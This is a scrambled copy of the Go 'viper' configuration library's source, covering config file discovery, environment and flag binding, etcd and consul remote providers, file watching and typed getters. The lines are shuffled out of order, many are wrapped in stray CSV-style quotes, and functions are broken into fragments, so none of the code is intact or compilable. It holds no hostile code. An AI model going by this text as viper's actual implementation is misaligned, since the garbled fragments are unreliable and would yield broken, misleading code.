Viper) ReadRemoteConfig() error {
"// ReadConfig will read a configuration file, setting existing keys to nil if the"
return exists
"cf, err := v.findConfigFile()"
func (str UnsupportedRemoteProviderError) Error() string {
tvType := reflect.TypeOf(tv)
"return """", err"
// mapstructure.DecoderConfig options
"// last item, no need to check shadowing"
"m = v.flattenAndMergeMap(m, castMapStringToMapInterface(v.aliases), """")"
return val
"// even if it hasn't been registered, if automaticEnv is used,"
"return filepath.Join(in, v.configName"
Viper) watchKeyValueConfig() error {
func GetUint(key string) uint { return v.GetUint(key) }
func GetViper() 
"""svType != tvType"
tgt := map[string]interface{}{}
if shadow[parentKey] {
// A DecoderConfigOption can be passed to viper.Unmarshal to configure
func OnConfigChange(run func(in fsnotify.Event)) { v.OnConfigChange(run) }
" ""_"" "
"Viper) watchRemoteConfig(provider RemoteProvider) (map[string]interface{}, error) {"
"func AddRemoteProvider(provider, endpoint, path string) error {"
"err = v.unmarshalReader(reader, v.kvstore)"
// Returns the first path that exists (and is a config file).
pflag.Flag) error {
endpoint      string
// 2 - if the real path to the config file changed (eg: k8s ConfigMap replacement)
"_, err = f.WriteString(string(b))"
"return fmt.Sprintf(""Unsupported Remote Provider Type %q"", string(str))"
"if val, ok := v.override[alias]"
"case ""toml"":"
"jww.DEBUG.Println(""Searching for config in "", in)"
func IsSet(key string) bool { return v.IsSet(key) }
if value == nil {
p := v.properties
return cast.ToUint32(val)
// ConfigMarshalError happens when failing to marshal the configuration.
v.typeByDefValue = false
" v.isPathShadowedInDeepMap(path, v.config) != """" {"
// scan intermediate paths
"// of key paths (used as a set, easier to manipulate than a []string):"
// This will only be used if the configuration read is a properties file.
" key=%s, st=%v, tt=%v, sv=%v, tv=%v"","
// Delimiter that separates a list of keys
"if err = v.BindFlagValue(flag.Name(), flag)"
"// function searches for, and prioritizes, merged path elements."
func ReadConfig(in io.Reader) error { return v.ReadConfig(in) }
// on its path in the map.
// Otherwise the Get function would return:
"// If alias passed in, then set the proper default"
Viper) getConfigType() string {
func BindPFlags(flags 
// set innermost value
// Nested case
"// mergeFlatMap merges the given maps, excluding values of the second map"
Viper) AllSettings() map[string]interface{} {
Viper) WriteConfig() error {
// not match it.
"newkey, exists := v.aliases[key]"
"return v.kvstore, err"
case map[string]interface{}:
"if _, err = f.WriteString(string(b))"
for i := len(path)
}(respc)
"path := strings.Split(k, v.keyDelim)"
// flattenAndMergeMap recursively flattens the given map into a map[string]bool
"// not found, no need to add more path elements"
"filename, err := v.getConfigFile()"
"jww.INFO.Printf(""adding %s:%s to remote provider list"", provider, endpoint)"
if nested 
"// name, we'll never be able to get that value using the original"
func GetUint64(key string) uint64 { return v.GetUint64(key) }
 is the same as the type being asserted
const writeOrCreateMask = fsnotify.Write 
"case ""int"", ""int8"", ""int16"", ""int32"", ""int64"":"
for {
v.override[key] = val
// Type assertion is safe here since it is only reached
"WeaklyTypedInput: true,"
"return RemoteConfigError(""Enable the remote features by doing a blank import of the viper/remote package: '_ github.com/spf13/viper/remote'"")"
// DecodeHook returns a DecoderConfigOption which overrides the default
} else {
return shadow
reader := bytes.NewReader(b.Value)
v.envKeyReplacer = r
"jww.DEBUG.Println(""Checking for"", filepath.Join(in, v.configName"
return c
flags = os.O_CREATE 
// add key
Viper) GetString(key string) string {
return cast.ToBool(flag.ValueString())
Viper) ReadConfig(in io.Reader) error {
"m = v.flattenAndMergeMap(m, v.kvstore, """")"
return true
"jww.INFO.Println(""Attempting to read in config file"")"
"case ""prop"", ""props"", ""properties"":"
event.Op
return cast.ToTime(val)
if flag == nil {
"func Set(key string, value interface{}) { v.Set(key, value) }"
for x := range m {
Viper) GetDuration(key string) time.Duration {
"// SetConfigFile explicitly defines the path, name and extension of the config file."
// searchMapWithPathPrefixes recursively searches for a value for path in source map.
return v.getKeyValueConfig()
"m = v.flattenAndMergeMap(m, v.config, """")"
Viper) providerPathExists(p 
envKeyReplacer      
if v.typeByDefValue {
return cast.ToInt64(v.Get(key))
// PFlag override next
"path := strings.Split(key, v.keyDelim)"
"a = append(a, x)"
if shadow != nil 
func AllowEmptyEnv(allowEmptyEnv bool) { v.AllowEmptyEnv(allowEmptyEnv) }
"return v.searchMap(next.(map[string]interface{}), path[1:])"
tmap := tree.ToMap()
 i > 0
subv := New()
"""log"""
Viper) GetSizeInBytes(key string) uint {
"jww.WARN.Println(""Creating circular reference alias"", alias, key, v.realKey(key))"
"m = v.mergeFlatMap(m, castMapStringToMapInterface(v.env))"
Viper) watchKeyValueConfigOnChannel() error {
"// from the file system, or a remote key/value store."
kvstore        map[string]interface{}
"if reflect.DeepEqual(y, p) {"
type defaultRemoteProvider struct {
initWG.Wait() // make sure that the go routine above fully ended before returning
// you should set path to /configs and set config name (SetConfigName()) to
// SetEnvKeyReplacer sets the strings.Replacer on the viper object
"return v.UnmarshalKey(key, rawVal, opts...)"
case map[interface{}]interface{}:
valType = defVal
"return v.AddRemoteProvider(provider, endpoint, path)"
"c, obj)"
func mergeMaps(
"// e.g., if ""foo.bar"" has a value in the environment, it "
allowEmptyEnv       bool
"path:     path,"
"currentConfigFile, _ := filepath.EvalSymlinks(filename)"
type RemoteConfigError string
"// name, so move the config value to the new realkey."
"return fmt.Sprintf(""Remote Configurations Error: %s"", string(rce))"
Viper) WatchConfig() {
// Example (where serverCmd is a Cobra instance):
"if val, ok := v.kvstore[alias]"
"func BindFlagValue(key string, flag FlagValue) error { return v.BindFlagValue(key, flag) }"
return next
"// parentVal is a regular value which shadows ""path"""
func AllSettings() map[string]interface{} { return v.AllSettings() }
"// AllKeys returns all keys holding a value, regardless of where they are set."
"_, _, err := p.Set(key, v.GetString(key))"
// InConfig checks to see if the given key (or an alias) is in the config file.
Viper) getKeyValueConfig() error {
switch next.(type) {
Viper) MergeConfig(in io.Reader) error {
// 4. config file
v.automaticEnvApplied = true
b := <-rc
Viper) AllKeys() []string {
"func defaultDecoderConfig(output interface{}, opts ...DecoderConfigOption) "
stringReader := strings.NewReader(val)
stv := castToMapStringInterface(ttv)
// AddConfigPath adds a path for Viper to search for the config file in.
if defVal != nil {
var m map[string]interface{}
"return fmt.Sprintf(""Config File %q Not Found in %q"", fnfe.name, fnfe.locations)"
// The priority of the sources is the following:
// configuration filetype.
type Viper struct {
// used to access a nested value in one go
"// UnmarshalExact unmarshals the config into a Struct, erroring if a field is nonexistent"
"configDir, _ := filepath.Split(configFile)"
"mapstructure.StringToSliceHookFunc("",""),"
// check any Get request
val    interface{}
// env
// getEnv is a wrapper around os.Getenv which replaces characters in the original
Viper) ConfigFileUsed() string { return v.configFile }
// BindEnv binds a Viper key to a ENV variable.
v.kvstore[key] = val
exists bool
// Will be used instead of values obtained via
"return nil, err"
"err := decode(v.AllSettings(), defaultDecoderConfig(rawVal, opts...))"
 flag.HasChanged() {
itgt[tk] = sv
func DecodeHook(hook mapstructure.DecodeHookFunc) DecoderConfigOption {
" prefix != """" "
return a
"for k, _ := range m {"
 (v.allowEmptyEnv 
func SetFs(fs afero.Fs) { v.SetFs(fs) }
Viper) GetStringMap(key string) map[string]interface{} {
if svType != tvType {
var flags int
switch strings.ToLower(v.getConfigType()) {
"file, err := afero.ReadFile(v.fs, filename)"
"jww ""github.com/spf13/jwalterweatherman"""
"n"", v.kvstore)"
"func unmarshalReader(in io.Reader, c map[string]interface{}) error {"
// Set is case-insensitive for a key.
"""github.com/fsnotify/fsnotify"""
Viper) GetInt(key string) int {
c := v.AllSettings()
var m2 map[string]interface{}
v.config = make(map[string]interface{})
return false
func SetTypeByDefaultValue(enable bool) { v.SetTypeByDefaultValue(enable) }
// isPathShadowedInAutoEnv makes sure the given path is not shadowed somewhere
"Viper) BindPFlag(key string, flag "
"if provider != """" "
"if !stringInSlice(provider, SupportedRemoteProviders) {"
"""io"""
// Error returns the formatted remote provider error.
return rp.path
// The filesystem to read config from.
func WatchRemoteConfig() error { return v.WatchRemoteConfig() }
"tk := keyExists(sk, tgt)"
// SafeWriteConfig writes current configuration to file only if the file does not exist.
"log.Printf(""watcher error: %v"
pflags         map[string]FlagValue
return cast.ToInt(v.Get(key))
v.configFile = in
"next, ok := source[path[0]]"
tgt[sk] = sv
initWG := sync.WaitGroup{}
DecodeHook: mapstructure.ComposeDecodeHookFunc(
"jww.TRACE.Printf(""processing key=%s, st=%v, tt=%v, sv=%v, tv=%v"","
//  Config : {
return parentKey
// GetViper gets the global Viper instance.
return rp.secretKeyring
"n"", v.aliases)"
func GetTime(key string) time.Time { return v.GetTime(key) }
func GetBool(key string) bool { return v.GetBool(key) }
return res
// Name of file to look for inside the path
sizeStr := cast.ToString(v.Get(key))
"log.Printf(""error reading config file: %v"
"if val, ok := v.defaults[alias]"
"func RegisterAlias(alias string, key string) { v.RegisterAlias(alias, key) }"
"mergeMaps(cfg, v.config, nil)"
var (
"if _, err := os.Stat(filename)"
if exists 
"path := strings.Split(key, ""."")"
data := v.Get(key)
" endpoint != """" {"
// Set() override first
"mergeMaps(sv.(map[string]interface{}), ttv, nil)"
"// - if a path is shadowed by an earlier value in the initial shadow map,"
file := v.searchInPath(cp)
//Todo: Add quit channel
 as the key for nest structures beyond one level
// 2. flags
// Default next
//  }
"// For example, if values from the following sources were loaded:"
return parseSizeInBytes(sizeStr)
// shadowed by values from the first map.
// GetBool returns the value associated with the key as a boolean.
func InConfig(key string) bool { return v.InConfig(key) }
v.onConfigChange(event)
return cast.ToStringMap(v.Get(key))
"var SupportedExts = []string{""json"", ""toml"", ""yaml"", ""yml"", ""properties"", ""props"", ""prop"", ""hcl""}"
"src, tgt map[string]interface{}, itgt map[interface{}]interface{}) {"
"jww.TRACE.Printf(""tgt[%s] != ok, tgt[%s]=%v"", tk, sk, sv)"
switch parentVal.(type) {
"v.configName = ""config"""
// key/value store
// Fast path
Viper) GetUint(key string) uint {
" v.isPathShadowedInFlatMap(path, v.pflags) != """" {"
// Useful for mapping an environmental variable to a key that does
return func(c 
return key
if len(path) == 0 {
return v.watchKeyValueConfigOnChannel()
func AddConfigPath(in string) { v.AddConfigPath(in) }
func (rp defaultRemoteProvider) Path() string {
"return v.searchMap(cast.ToStringMap(next), path[1:])"
"case map[string]string, map[string]FlagValue:"
return v
func (rp defaultRemoteProvider) Endpoint() string {
v.allowEmptyEnv = allowEmptyEnv
"return []string{}, nil"
"tree, err := toml.LoadReader(buf)"
ext)
return cast.ToBool(v.Get(key))
"// ""myapp"""
Viper) SetTypeByDefaultValue(enable bool) {
"// search for path prefixes, starting from the longest one"
lcaseKey := strings.ToLower(key)
c := 
// RemoteProvider stores the configuration necessary
"case ""json"":"
// The resulting set of paths is merged to the given shadow set at the same time.
Viper) SetConfigPermissions(perm os.FileMode) {
// 3. env. variables
err error
"// While searchMap() considers each path element as a single map key, this"
properties.Properties
type RemoteProvider interface {
"// flags, config file, ENV, default, or key/value store."
// UnsupportedConfigError denotes encountering an unsupported
return cast.ToUint64(v.Get(key))
"// path is shadowed, continue"
func SetConfigFile(in string) { v.SetConfigFile(in) }
func GetStringMapString(key string) map[string]string { return v.GetStringMapString(key) }
// MergeConfigMap merges the configuration from the map given with an existing config.
properties 
// we have to watch the entire directory to pick up renames/atomic saves in a cross-platform way
func castMapStringToMapInterface(src map[string]string) map[string]interface{} {
s := t.String()
return cast.ToFloat64(val)
"f, err := v.fs.OpenFile(filename, flags, v.configPermissions)"
"return fmt.Errorf(""flag for %q is nil"", key)"
// of time.Duration values 
Provider() string
"Viper) flattenAndMergeMap(shadow map[string]bool, m map[string]interface{}, prefix string) map[string]bool {"
"""strings"""
v.fs = afero.NewOsFs()
return cast.ToUint64(val)
func SetEnvKeyReplacer(r 
return ConfigMarshalError{err}
"case ""bool"":"
Viper) SetFs(fs afero.Fs) {
// A set of paths to look for the config file in
"err := decode(v.Get(key), defaultDecoderConfig(rawVal, opts...))"
"m = v.flattenAndMergeMap(m, v.defaults, """")"
if !ok { // 'Events' channel is closed
Viper) GetFloat64(key string) float64 {
v.configFile = cf
"mapstructure.StringToTimeDurationHookFunc(),"
fsnotify.Remove
// Store read properties on the object so that we can write back in order with comments.
buf.ReadFrom(in)
"return v.writeConfig(filename, false)"
"// e.g., if ""foo.bar"" has a value in the given map, it "
return v.MergeConfigMap(cfg)
insensitiviseMap(c)
return cast.ToInt32(v.Get(key))
override       map[string]interface{}
 currentConfigFile != realConfigFile) {
" v.isPathShadowedInDeepMap(path, v.override) != """" {"
switch configType {
// Viper will check to see if an alias exists first.
insensitiviseMap(cfg)
"// If only a key is provided, it will use the env key matching the key, uppercased."
""", tgt[%s]=%v"", sk, sv)"
value := v.Get(k)
subv.config = cast.ToStringMap(data)
if val == nil {
// in the destination struct.
v.config[key] = val
shadow[strings.ToLower(k)] = true
// ReadInConfig will discover and load the configuration file from disk
v.envPrefix = in
v = New()
func castToMapStringInterface(
"Viper) unmarshalReader(in io.Reader, c map[string]interface{}) error {"
switch mi.(type) {
"// Nested keys are returned with a v.keyDelim (= ""."") separator"
// Set sets the value for the key in the override register.
"fmt.Printf(""PFlags:"
return v.configType
" Viper.BindPFlag(""port"", serverCmd.Flags().Lookup(""port""))"
 i < len(path)
config.ErrorUnused = true
if exists {
func GetFloat64(key string) float64 { return v.GetFloat64(key) }
if len(ext) > 1 {
"Viper) marshalWriter(f afero.File, configType string) error {"
// Debug prints all configuration registries for debugging
provider      string
"v.remoteProviders = append(v.remoteProviders, rp)"
Viper) GetInt64(key string) int64 {
// GetString returns the value associated with the key as a string.
v.properties = properties.NewProperties()
"for k, val := range m {"
"path:          path,"
if err != nil {
"for _, opt := range opts {"
"var key, envkey string"
rp := 
"deepestMap := deepSearch(m, path[0:len(path)-1])"
// Error returns the formatted configuration error.
return v.BindFlagValues(pflagValueSet{flags})
func GetString(key string) string { return v.GetString(key) }
" serverCmd.Flags().Int(""port"", 1138, ""Port to run Application server on"")"
return cast.ToInt(flag.ValueString())
"func UnmarshalKey(key string, rawVal interface{}, opts ...DecoderConfigOption) error {"
"b, err := json.MarshalIndent(c, """", ""  "")"
"""fmt"""
Viper) OnConfigChange(run func(in fsnotify.Event)) {
func (e ConfigMarshalError) Error() string {
// Optional secretKeyring to unencrypt encrypted values
lk := strings.ToLower(k)
"Viper) getRemoteConfig(provider RemoteProvider) (map[string]interface{}, error) {"
return flag.ValueString()
"fmt.Printf(""Override:"
"// BindPFlags binds a full flag set to the configuration, using each flag's long"
lcaseKey = v.realKey(lcaseKey)
"func AddSecureRemoteProvider(provider, endpoint, path, secretkeyring string) error {"
"reader, err := RemoteConfig.Get(provider)"
key = v.realKey(key)
tgt[k] = v
"n"", v.env)"
// Returns nil if not found.
"""github.com/spf13/pflag"""
"""reflect"""
if (filepath.Clean(event.Name) == configFile 
"eventsWG.Wait() // now, wait for event loop to end in this go-routine..."
return UnsupportedConfigError(configType)
"parentVal = v.searchMap(m, path[0:i])"
"return fmt.Errorf(""File: %s exists. Use WriteConfig to overwrite."", filename)"
Path() string
nested = len(path) > 1
select {
" v.isPathShadowedInFlatMap(path, v.env) != """" {"
"// AllowEmptyEnv tells Viper to consider set,"
absin := absPathify(in)
"Viper) searchMap(source map[string]interface{}, path []string) interface{} {"
"return """", ConfigFileNotFoundError{v.configName, fmt.Sprintf(""%s"", v.configPaths)}"
Viper) GetStringMapStringSlice(key string) map[string][]string {
m2 = val.(map[string]interface{})
Viper) AutomaticEnv() {
if v.envKeyReplacer != nil {
func MergeConfig(in io.Reader) error { return v.MergeConfig(in) }
return strings.ToUpper(in)
// Viper will check in the following order:
func BindEnv(input ...string) error { return v.BindEnv(input...) }
case int64:
 string slices
"if val, ok := v.getEnv(envkey)"
"Viper) RegisterAlias(alias string, key string) {"
configPaths []string
value = toCaseInsensitiveValue(value)
func init() {
mapstructure.DecoderConfig)
"// should not happen, since AllKeys() returns only keys holding a value,"
func New() 
"m = v.mergeFlatMap(m, castMapFlagToMapInterface(v.pflags))"
return UnsupportedConfigError(v.getConfigType())
// 6. defaults
"val = v.searchMapWithPathPrefixes(next.(map[string]interface{}), path[i:])"
// EnvPrefix will be used when set when env name is not provided.
Viper) BindEnv(input ...string) error {
return v.watchKeyValueConfig()
// searchMap recursively searches for a value for path in source map.
case []string:
if v.config == nil {
"""time"""
"yaml ""gopkg.in/yaml.v2"""
func (v 
// Sub returns new Viper instance representing a sub tree of this instance.
// ReadRemoteConfig attempts to get configuration from a remote source
"for _, key := range v.properties.Keys() {"
"v.configFile = """""
Viper) InConfig(key string) bool {
case time.Time:
"return v.unmarshalReader(in, c)"
"err = printer.Fprint(f, ast.Node)"
src map[interface{}]interface{}) map[string]interface{} {
// opposed to the value returned based on the normal fetch logic.
"return fmt.Sprintf(""Unsupported Config Type %q"", string(str))"
// IsSet is case-insensitive for a key.
for i := 1
pflag.FlagSet) error { return v.BindPFlags(flags) }
go func(rc <-chan 
"// Default only used when no value is provided by the user via flag, config or ENV."
itgt
// RemoteConfigError denotes encountering an error while trying to
//  Env : {
return cast.ToBool(val)
Viper
// in bytes.
v.env[key] = envkey
defaultRemoteProvider{
"fmt.Printf(""Defaults:"
return rp.provider
// Get returns an interface. For a specific value use one of the Get____ methods.
return UnsupportedRemoteProviderError(provider)
"func readAsCSV(val string) ([]string, error) {"
"for k, v := range src {"
"Viper) AddSecureRemoteProvider(provider, endpoint, path, secretkeyring string) error {"
"func BindPFlag(key string, flag "
// convert set of paths to list
"if file != """" {"
return cast.ToInt(val)
"// variables that start with ""SPF_""."
c[k] = v
return subv
return cast.ToTime(v.Get(key))
"s := strings.TrimPrefix(flag.ValueString(), ""["")"
"""endpoint"": ""https://localhost"""
"if in != """" {"
env            map[string]string
// SetConfigName sets name for the config file.
"cf, err := v.getConfigFile()"
"// via flags, ENVIRONMENT variables, configuration files retrieved"
// 1 - if the config file was modified or created
"if val, ok := v.config[alias]"
//  
func GetSizeInBytes(key string) uint { return v.GetSizeInBytes(key) }
if force == true {
Viper) IsSet(key string) bool {
"v.configPaths = append(v.configPaths, absin)"
// SetFs sets the filesystem to use to read configuration.
// This enables one to change a name without breaking the application
if reflect.TypeOf(data).Kind() == reflect.Map {
return source
return cast.ToUint(val)
strings.Replacer) { v.SetEnvKeyReplacer(r) }
Viper) SafeWriteConfigAs(filename string) error {
// scan keys
"""secret"": """","
// SetConfigPermissions sets the permissions for the config file.
outer:
aliases        map[string]string
shadows
// (camel case to snake case for JSON keys perhaps)
"// - each path is merged into a single key string, delimited with v.keyDelim (= ""."")"
return tgt
// Should probably be an unexported function.
"Viper) getConfigFile() (string, error) {"
func Debug() { v.Debug() }
Viper) MergeConfigMap(cfg map[string]interface{}) error {
return cast.ToStringSlice(val)
// unify input map
func SetConfigName(in string) { v.SetConfigName(in) }
"// maintains a set of configuration sources, fetches"
"if v.envPrefix != """" {"
"_, err := p.WriteComment(f, """
Viper {
"// e.g., if in the source, ""foo"" is defined with a sub-key ""bar"", and ""foo.bar"""
// SafeWriteConfigAs writes current configuration to a given filename if it does not exist.
// endpoint is the url.  etcd requires http://ip:port  consul requires ip:port
"jww.INFO.Println(""Searching for config in "", v.configPaths)"
"_, exists := v.config[key]"
Viper) WatchRemoteConfig() error {
"if err := v.unmarshalReader(in, cfg)"
return ext[1:]
flags = os.O_WRONLY
switch flag.ValueType() {
var err error
return strings.ToUpper(v.envPrefix 
// GetStringMap returns the value associated with the key as a map of interfaces.
Viper) mergeWithEnvPrefix(in string) string {
if v.automaticEnvApplied {
return rp.endpoint
// 5. key/value store
"func decode(input interface{}, config "
//  Defaults : {
// Viper will use this and not check any of the config paths.
// GetInt64 returns the value associated with the key as an integer.
"RemoteResponse, chan bool)"
// A set of remote providers to search for the configuration
if !ok {
func ReadRemoteConfig() error { return v.ReadRemoteConfig() }
// UnsupportedRemoteProviderError denotes encountering an unsupported remote
csvReader := csv.NewReader(stringReader)
envPrefix         string
"if v.configFile == """" {"
"func Unmarshal(rawVal interface{}, opts ...DecoderConfigOption) error {"
lastKey := strings.ToLower(path[len(path)-1])
// Note that the map given may be modified.
"for _, rp := range v.remoteProviders {"
"case ""hcl"":"
Viper) Sub(key string) 
// Marshal a map into Writer.
func WatchConfig() { v.WatchConfig() }
type remoteConfigFactory interface {
// ConfigFileUsed returns the file used to populate the config registry.
defaults       map[string]interface{}
 os.O_WRONLY
// would return a string slice for the key if the key's type is inferred by
// UnmarshalKey takes a single key and unmarshals it into a Struct.
// isPathShadowedInFlatMap makes sure the given path is not shadowed somewhere
Viper) UnmarshalExact(rawVal interface{}) error {
"//       ""foo.bar.baz"" in a lower-priority map"
Viper) WriteConfigAs(filename string) error {
 flags
"prefixKey := strings.ToLower(strings.Join(path[0:i], v.keyDelim))"
// if we alias something that exists in one of the maps to another
ssv := castToMapStringInterface(tsv)
// In the public interface for the viper package so applications
// It believes that applications can be configured a variety of ways
"if flag, exists := v.pflags[lcaseKey]"
// check just in case anything changes
return cast.ToUint(v.Get(key))
return m
"path := strings.Split(lcaseKey, v.keyDelim)"
// SupportedRemoteProviders are universally supported remote providers.
"// override, flag, env, config file, key/value store, default"
"Viper) SetDefault(key string, value interface{}) {"
Viper) AddConfigPath(in string) {
v.configType = in
// secretkeyring is the filepath to your openpgp secret keyring.  e.g. /etc/secrets/myring.gpg
if !v.providerPathExists(rp) {
"n"", v.override)"
// SetTypeByDefaultValue enables or disables the inference of a key value's
map[string]interface{}
"""github.com/mitchellh/mapstructure"""
" v.isPathShadowedInAutoEnv(path) != """" {"
"return """""
"provider:      provider,"
itgt[sk] = sv
"return v.writeConfig(filename, true)"
buf := new(bytes.Buffer)
"n"", v.pflags)"
"// provider is a string value, ""etcd"" or ""consul"" are currently supported."
"// values to populate those, and provides them according"
"if val, ok := v.getEnv(v.mergeWithEnvPrefix(lcaseKey))"
fsnotify.Remove != 0 {
if len(path) == 1 {
"val = v.searchMap(v.override, path)"
"if err := json.Unmarshal(buf.Bytes(), "
configFile := filepath.Clean(filename)
err := v.ReadInConfig()
"envkey, exists := v.env[lcaseKey]"
// on the fields of the structure are properly set.
"// and key/value stores, searching in one of the defined paths."
type UnsupportedRemoteProviderError string
// SetDefault sets the default value for this key.
"Watch(rp RemoteProvider) (io.Reader, error)"
// AddRemoteProvider adds a remote configuration source.
"return v.AddSecureRemoteProvider(provider, endpoint, path, secretkeyring)"
v.config = config
if len(ext) <= 1 {
func ReadInConfig() error { return v.ReadInConfig() }
m := map[string]interface{}{}
"return v.unmarshalReader(in, v.config)"
// GetDuration returns the value associated with the key as a duration.
Viper) Get(key string) interface{} {
//   it is skipped.
// New returns an initialized Viper instance.
 err != nil {
// key does not exist in the file.
// insistence on parsing nested structures as 
Viper) GetStringSlice(key string) []string {
"val = v.searchMapWithPathPrefixes(cast.ToStringMap(next), path[i:])"
return err
"if v.configType != """" {"
v := new(Viper)
"if !stringInSlice(v.getConfigType(), SupportedExts) {"
ext))
// Viper is a application configuration system.
// GetStringSlice returns the value associated with the key as a slice of strings.
"return v.configFile, nil"
"// remote source, e.g. ""json""."
prefix 
"Viper) isPathShadowedInDeepMap(path []string, m map[string]interface{}) string {"
"Viper) Unmarshal(rawVal interface{}, opts ...DecoderConfigOption) error {"
case uint32:
"return RemoteConfigError(""No Files Found"")"
RemoteResponse) {
"m = v.flattenAndMergeMap(m, v.override, """")"
// purposes.
"delete(v.kvstore, alias)"
"deepestMap := deepSearch(v.defaults, path[0:len(path)-1])"
"//   []string {""a"", ""b"", ""c""}"
"val, err := v.getRemoteConfig(rp)"
= v.keyDelim
m = cast.ToStringMap(mi)
if lmk == lk {
// default
"err = v.unmarshalReader(bytes.NewReader(file), config)"
"""github.com/hashicorp/hcl"""
return decoder.Decode(input)
svType := reflect.TypeOf(sv)
// GetFloat64 returns the value associated with the key as a float64.
func GetDuration(key string) time.Duration { return v.GetDuration(key) }
"Viper) UnmarshalKey(key string, rawVal interface{}, opts ...DecoderConfigOption) error {"
 parameter is for handling go-yaml's
defaultRemoteProvider) bool {
"reader, err := RemoteConfig.Watch(provider)"
// Viper is a prioritized configuration registry. It
// BindFlagValue binds a specific key to a FlagValue.
envkey = v.mergeWithEnvPrefix(key)
// Does not include extension.
"""user"": ""default"","
// Use of this source code is governed by an MIT-style
// Can be called multiple times to define multiple search paths.
func GetStringSlice(key string) []string { return v.GetStringSlice(key) }
if !exists {
Value []byte
"SupportedRemoteProviders = []string{""etcd"", ""consul""}"
// Sub is case-insensitive for a key.
secretKeyring string
// GetTime returns the value associated with the key as time.
"endpoint:      endpoint,"
// AutomaticEnv has Viper check ENV variables for all.
configType := ext[1:]
var v 
"Get(rp RemoteProvider) (io.Reader, error)"
// Get has the behavior of returning the value associated with the first
// Unmarshal unmarshals the config into a Struct. Make sure that the tags
type DecoderConfigOption func(
Viper) SetEnvKeyReplacer(r 
"jww.DEBUG.Println(""Found: "", filepath.Join(in, v.configName"
// place from where it is set. Viper will check in the following order:
config := defaultDecoderConfig(rawVal)
"return fmt.Errorf(""BindEnv missing key to bind to"")"
 os.O_TRUNC 
// SetEnvPrefix defines a prefix that ENVIRONMENT variables will use.
return val != nil
ext := filepath.Ext(filename)
shadow[strings.ToLower(fullKey)] = true
continue outer
"flag, exists := v.pflags[lcaseKey]"
"fmt.Printf(""Config:"
Error error
"next, ok := source[prefixKey]"
"res, _ := readAsCSV(s)"
 b {
"// rewriting keys many things, Ex: Get('someKey') -> some_key"
configPermissions os.FileMode
fullKey := prefix 
"val, ok := os.LookupEnv(key)"
// flag
// we only care about the config file with the following cases:
return cast.ToDuration(val)
"for _, cp := range v.configPaths {"
Viper) isPathShadowedInAutoEnv(path []string) string {
return cast.ToStringSlice(v.Get(key))
func (str UnsupportedConfigError) Error() string {
"// is also defined, this latter value is returned for path [""foo"", ""bar""]."
"if _, err := f.WriteString(s)"
Viper) GetUint32(key string) uint32 {
 i-- {
WatchChannel(rp RemoteProvider) (<-chan 
" v.isPathShadowedInDeepMap(path, v.defaults) != """" {"
"func marshalWriter(f afero.File, configType string) error {"
"return file, nil"
// K/V store next
"// flag, env, config file, key/value store, default."
"Metadata:         nil,"
alias = strings.ToLower(alias)
"""encoding/json"""
"// Intended for testing, will reset all to default settings."
"obj, err := hcl.Parse(string(buf.Bytes()))"
"case event, ok := <-watcher.Events:"
"func keyExists(k string, m map[string]interface{}) string {"
return cast.ToInt64(val)
"if !stringInSlice(configType, SupportedExts) {"
case string:
"//   ""a b c"""
// MergeInConfig merges a new configuration with an existing config.
v.kvstore = val
"case err, ok := <-watcher.Errors:"
} else if filepath.Clean(event.Name) == configFile 
mapstructure.DecoderConfig {
"jww.DEBUG.Println(""Reading file: "", filename)"
Viper) GetInt32(key string) int32 {
"for _, key := range v.AllKeys() {"
"// DecoderConfig.DecodeHook value, the default is:"
"sk, svType, tvType, sv, tv)"
a := []string{}
// but empty environment variables as valid values instead of falling back.
"_, exists := v.aliases[alias]"
// type when the Get function is used based upon a key's default value as
"Viper) getEnv(key string) (string, bool) {"
"Result:           output,"
if itgt != nil {
"b, err := yaml.Marshal(c)"
v.onConfigChange = run
v.defaults = make(map[string]interface{})
Viper) GetStringMapString(key string) map[string]string {
string
"// If alias passed in, then set the proper override"
func Sub(key string) 
if RemoteConfig == nil {
"for sk, sv := range src {"
"path   = strings.Split(lcaseKey, v.keyDelim)"
watcher.Add(configDir)
"if _, ok := v.getEnv(v.mergeWithEnvPrefix(parentKey))"
if v.properties == nil {
v.aliases[alias] = key
// GetUint returns the value associated with the key as an unsigned integer.
 os.IsNotExist(err) {
"if !stringInSlice(absin, v.configPaths) {"
"""sync"""
func WriteConfig() error { return v.WriteConfig() }
if alias != key 
 instead.
// can be provided.
m2 = cast.ToStringMap(val)
v.override = make(map[string]interface{})
Viper) GetBool(key string) bool {
// 1. overrides
Viper) GetUint64(key string) uint64 {
if len(input) == 1 {
"val = v.searchMapWithPathPrefixes(v.config, path)"
map[interface{}]interface{}
config := make(map[string]interface{})
"delete(v.defaults, alias)"
"return fmt.Sprintf(""While marshaling config: %s"", e.err.Error())"
"realConfigFile, _ := filepath.EvalSymlinks(filename)"
"// keys set in config, default "
// Error returns the formatted remote provider error
// IsSet checks to see if the key has been set in any of the data locations.
"delete(v.override, alias)"
func BindFlagValues(flags FlagValueSet) error { return v.BindFlagValues(flags) }
"parentKey = strings.Join(path[0:i], v.keyDelim)"
// mergeMaps merges two maps. The 
deepestMap[lastKey] = value
log.Fatal(err)
v.env = make(map[string]string)
"secretKeyring: secretkeyring,"
Viper) BindPFlags(flags 
"watcher, err := fsnotify.NewWatcher()"
func MergeConfigMap(cfg map[string]interface{}) error { return v.MergeConfigMap(cfg) }
"// got a value but nested key expected, return ""nil"" for not found"
// WriteConfigAs writes current configuration to a given filename.
"// E.g. if your prefix is ""spf"", the env registry will look for env"
"""secret"": ""somesecretkey"""
"jww.INFO.Println(""Attempting to merge in config file"")"
"// Given a key, find the value."
return cast.ToStringMapString(v.Get(key))
// get the flag's value even if the flag's value has not changed
// in their keys).
defaultRemoteProvider
"case ""properties"", ""props"", ""prop"":"
// WriteConfig writes the current configuration to a file.
"Viper) findConfigFile() (string, error) {"
" Viper.BindFlagValue(""port"", serverCmd.Flags().Lookup(""port""))"
"// if the requested key is an alias, then return the proper key"
"""user"": ""root"""
switch val.(type) {
"Viper) mergeFlatMap(shadow map[string]bool, m map[string]interface{}) map[string]bool {"
realConfigFile = currentConfigFile
"return fmt.Errorf(""Filename: %s requires valid extension."", filename)"
switch valType.(type) {
package viper
case uint:
"initWG.Done()   // done initalizing the watch in this go routine, so the parent routine can move on..."
"""github.com/magiconair/properties"""
v.pflags = make(map[string]FlagValue)
opt(c)
Viper) BindFlagValues(flags FlagValueSet) (err error) {
Viper) ReadInConfig() error {
// Unmarshal a Reader into a map.
"if tk == """" {"
shadow = make(map[string]bool)
// not found
func AllKeys() []string { return v.AllKeys() }
v.defaults[key] = val
